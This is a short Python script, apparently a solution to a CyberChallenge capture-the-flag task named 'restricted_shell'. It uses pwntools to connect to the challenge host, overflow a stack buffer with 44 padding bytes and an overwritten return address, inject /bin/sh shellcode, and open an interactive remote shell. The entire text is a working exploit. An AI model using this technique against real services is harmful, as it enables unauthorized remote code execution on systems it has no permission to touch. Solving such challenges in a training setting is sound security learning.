from pwn import *

exe = ELF('/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 07/restricted_shell/restricted_shell')
context.binary = exe
p = remote("rshell.challs.cyberchallenge.it", 6003)

print("[+] Exploiting...")
shell_code = asm(shellcraft.sh())
p.sendlineafter(b'c:\ >', b'a'*44 + p32(0x8048593) + shell_code)
p.recvuntil('install')
p.recvuntil('\n\n')
p.interactive()
